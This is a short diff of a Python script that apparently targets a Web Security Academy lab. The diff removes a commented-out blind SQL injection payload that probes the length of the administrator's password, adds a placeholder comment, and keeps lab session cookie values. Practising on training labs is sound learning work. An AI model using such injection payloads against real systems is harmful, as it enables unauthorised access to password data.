@@ -6,7 +6,8 @@
 
 import requests
 import string
-#Mquery = """' AND (SELECT 'PPPP' FROM users WHERE username='administrator' and Length(password)>1 )='PPPP"""
+
+#Replace this Section with your URL and Cookies
 Cquery = "1UD2ou412FxzwwoT"
 SessionToken = 'm3wHlyH6OYEiuq8f1aOBLhWLb5C4H2qI'
 url = 'https://aca11f2c1ed55af7801b4f04003700a5.web-security-academy.net/'
